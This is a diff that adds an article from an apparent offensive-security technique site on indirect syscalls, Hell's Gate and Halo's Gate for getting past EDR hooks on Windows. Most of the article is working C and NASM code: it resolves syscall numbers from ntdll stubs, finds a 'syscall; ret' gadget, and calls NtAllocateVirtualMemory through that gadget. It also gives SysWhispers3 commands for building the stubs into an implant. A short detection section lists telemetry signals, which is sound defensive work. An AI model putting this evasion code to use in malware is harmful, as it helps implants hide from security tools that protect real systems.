@@ -1,0 +1,241 @@
+---
+title: Indirect Syscalls & Hell's Gate
+mitre: T1562.001
+category: evasion
+group: API Evasion
+summary: Dynamically resolve System Service Numbers at runtime and call them via trampolines in ntdll, bypassing EDR hooks without patching ntdll.
+platform: [Windows]
+tags: ['C / C++', 'ASM', 'x64', 'WinAPI']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: read ntdll on disk to get the syscall stubs
+    desc: Open the ntdll.dll from disk (bypasses in-memory hooks), locate NtAllocateVirtualMemory stub, read the SSN from mov eax, SSN.
+    dll: —
+  - call: extract the System Service Number from the stub
+    desc: At offset +4 bytes from the function entry, the unhooked stub contains mov eax, \u003cSSN\u003e. Extract the DWORD.
+    dll: —
+  - call: find a syscall; ret gadget inside ntdll
+    desc: Scan for the opcode sequence 0F 05 C3 (syscall; ret) inside ntdll's .text section to use as a trampoline.
+    dll: —
+  - call: set eax = SSN, call the gadget
+    desc: The indirect syscall sets EAX to the SSN and jumps into the ntdll gadget — the CPU executes the syscall instruction inside ntdll's address range.
+    dll: —
+detections:
+  - src: ETW-TI
+    text: Syscall originated from inside ntdll address range (which is expected) but RSP return address points to non-ntdll code — the gadget pattern.
+  - src: KERNEL
+    text: PreviousMode flip from user to kernel without a preceding legitimate ntdll call in the call stack — kernel integrity monitors can detect this.
+  - src: MEMORY SCAN
+    text: Thread stack contains a return address pointing into ntdll's .text section (the gadget) immediately above the calling code.
+  - src: YARA
+    text: mov eax, \u003cSSN\u003e followed by jmp to address inside ntdll range — assembler pattern for indirect syscall setup.
+related:
+  - mitre: T1562.001
+    title: Direct Syscalls
+    desc: Direct syscall variant — invokes the syscall instruction from the implant's own code rather than using an ntdll gadget.
+    href: /techniques/evasion/direct-syscalls
+  - mitre: T1055.001
+    title: NTDLL Unhooking
+    desc: Remove EDR hooks from ntdll entirely rather than routing around them.
+    href: /techniques/evasion/unhooking-ntdll
+  - mitre: T1036.005
+    title: Call Stack Spoofing
+    desc: Stack spoofing hides the origin of the call further up the chain.
+    href: /techniques/evasion/call-stack-spoofing
+labKit:
+  - label: SysWhispers3 (indirect + randomised stubs)
+    href: 'https://github.com/klezVirus/SysWhispers3'
+  - label: HellsGate (dynamic SSN resolution)
+    href: 'https://github.com/am0nsec/HellsGate'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+**Direct syscalls** (documented in the `direct-syscalls` article) place a `syscall` instruction directly in the implant's code. EDRs evolved to detect this by checking whether a syscall instruction's return address falls within the ntdll address range — legitimate calls always return to ntdll because legitimate code always goes through ntdll's stub.
+
+**Indirect syscalls** solve this: instead of placing `syscall` in the implant, set `EAX = SSN` and jump to a `syscall; ret` gadget that is physically located inside ntdll. The CPU executes the same syscall, but the return address and the instruction's location are both within ntdll — bypassing stack-based syscall origin checks.
+
+**Hell's Gate** (am0nsec & RtlMateusz, 2021) introduced dynamic SSN resolution: rather than hard-coding SSNs (which change across Windows versions), read the SSN from ntdll's own memory at runtime. If the stub is hooked (the EDR has patched it), Hell's Gate detects this and falls back to scanning adjacent stubs to infer the correct SSN.
+
+<Callout type="note">
+  Indirect syscalls are more resilient than direct syscalls against return-address-based stack
+  checks because the gadget sits inside ntdll. However, kernel-mode EDR drivers can still detect
+  them by correlating the thread's call stack at the syscall boundary — the frame below the
+  ntdll gadget will point into the implant's memory, not into another ntdll function.
+  This is a deeper inspection that fewer EDRs perform in production.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Hell's Gate — dynamic SSN extraction
+
+<CodeBlock
+  file="hells_gate.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include \u003cwindows.h\u003e
+#include \u003cwinternl.h\u003e
+
+// Read the SSN from an ntdll stub.
+// Unhooked stub layout at offset 0:
+//   4C 8B D1        mov r10, rcx
+//   B8 XX XX XX XX  mov eax, \u003cSSN\u003e    <- SSN at bytes 4-7
+//   0F 05           syscall
+//   C3              ret
+//
+// Hooked stub (EDR replaced the prologue with a jmp):
+//   E9 XX XX XX XX  jmp <hook>
+//
+// Hell's Gate: if the stub is hooked (byte 0 is 0xE9 or 0xFF),
+// scan adjacent (numerically sequential) stubs to infer the SSN.
+
+static BOOL read_ssn_from_stub(BYTE *stub, WORD *ssn) {
+    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&
+        stub[3] == 0xB8) {
+        // Unhooked: SSN is at bytes 4-7
+        *ssn = *(WORD*)(stub + 4);
+        return TRUE;
+    }
+    return FALSE;
+}
+
+// Halo's Gate extension: if the target stub is hooked, scan ±N neighbors
+// and compute the SSN by offset from the nearest clean stub.
+BOOL get_ssn_halos_gate(const char *fn_name, WORD *ssn) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE *fn = (BYTE*)GetProcAddress(ntdll, fn_name);
+    if (!fn) return FALSE;
+
+    // Try the target stub itself
+    if (read_ssn_from_stub(fn, ssn)) return TRUE;
+
+    // Scan forward and backward for an unhooked neighbor
+    // SSNs are sequential in the export table order — offset by 1 per function
+    for (int i = 1; i <= 32; i++) {
+        // Forward neighbor (higher SSN)
+        BYTE *next = fn + (i * 32);  // approximate stub size
+        WORD neighbor_ssn;
+        if (read_ssn_from_stub(next, &neighbor_ssn)) {
+            *ssn = neighbor_ssn - (WORD)i;
+            return TRUE;
+        }
+        // Backward neighbor (lower SSN)
+        BYTE *prev = fn - (i * 32);
+        if (read_ssn_from_stub(prev, &neighbor_ssn)) {
+            *ssn = neighbor_ssn + (WORD)i;
+            return TRUE;
+        }
+    }
+    return FALSE;
+}
+
+// Find a "syscall; ret" gadget inside ntdll .text
+PVOID find_syscall_gadget(void) {
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    BYTE *base = (BYTE*)ntdll;
+
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)base;
+    PIMAGE_NT_HEADERS nt  = (PIMAGE_NT_HEADERS)(base + dos->e_lfanew);
+    BYTE *text = base + nt->OptionalHeader.BaseOfCode;
+    DWORD sz   = nt->OptionalHeader.SizeOfCode;
+
+    for (DWORD i = 0; i < sz - 2; i++) {
+        if (text[i] == 0x0F && text[i+1] == 0x05 && text[i+2] == 0xC3)
+            return text + i;  // found: syscall; ret
+    }
+    return NULL;
+}`}
+/>
+
+### Indirect syscall invocation (ASM stub)
+
+<CodeBlock
+  file="indirect_syscall.asm"
+  label="ASM"
+  lang="nasm"
+  class="mb-7.5"
+  code={`; Indirect syscall stub for NtAllocateVirtualMemory
+; Parameters passed in RCX, RDX, R8, R9, stack (standard Win64 ABI)
+; SSN and gadget address resolved at runtime and stored in globals
+
+global NtAllocateVirtualMemory_indirect
+
+; These are filled in by C code before calling:
+extern g_ssn_ntavm       ; WORD — System Service Number
+extern g_gadget          ; PVOID — address of "syscall; ret" inside ntdll
+
+section .text
+NtAllocateVirtualMemory_indirect:
+    mov r10, rcx            ; NtXxx calling convention requires r10 = rcx
+    mov eax, [rel g_ssn_ntavm]   ; set EAX = SSN
+    ; Do NOT use syscall here — instead jump to the gadget inside ntdll
+    jmp qword [rel g_gadget]    ; lands in ntdll at "syscall; ret"
+                                 ; The syscall executes, ret returns to OUR caller`}
+/>
+
+### SysWhispers3 usage (automated indirect syscall generation)
+
+<CodeBlock
+  file="syswhispers3_usage.sh"
+  label="shell"
+  lang="shellsession"
+  class="mb-7.5"
+  code={`# Install SysWhispers3
+git clone https://github.com/klezVirus/SysWhispers3
+cd SysWhispers3
+
+# Generate indirect syscall stubs for specific NT functions
+python3 syswhispers.py \
+    --preset common \
+    --method jumper \           # indirect syscall (jmp to ntdll gadget)
+    --out-file syscalls
+
+# --method options:
+#   embedded   : direct syscall (syscall instruction in stub)
+#   jumper     : indirect syscall (jmp to ntdll gadget)
+#   jumper-rand: indirect + random instruction insertion for entropy
+
+# Generated files:
+#   syscalls.asm   : MASM assembly stubs
+#   syscalls.h     : function declarations
+#   syscalls.c     : SSN resolution code (Hell's Gate / Halo's Gate)
+
+# Compile into your project:
+# cl /c syscalls.asm
+# cl implant.c syscalls.obj syscalls.c`}
+/>
+
+## Direct vs Indirect vs Unhooking
+
+| Technique | EDR hook bypassed | Stack check bypassed | ntdll patched | Stability |
+|---|---|---|---|---|
+| Direct syscall | Yes | No (syscall not in ntdll) | No | High |
+| Indirect syscall | Yes | Partially (gadget in ntdll) | No | High |
+| NTDLL unhooking | Yes | Yes | Yes (restored) | High |
+| Kernel driver hook | Yes (user-mode only) | Yes | No | Requires driver |
+| In-process patching | Yes | N/A | Yes (hooks replaced) | Moderate |
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+The key detection signal for indirect syscalls is the **return address discrepancy**: when the CPU executes the syscall instruction inside ntdll, the return address on the stack points not to another ntdll function, but to the gadget's caller — which is in the implant's private memory. A kernel-mode ETW-TI callback that captures the call stack at every syscall boundary can detect this. The implementation cost is high (every syscall causes a kernel callback), which is why most production EDRs do not check this universally.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
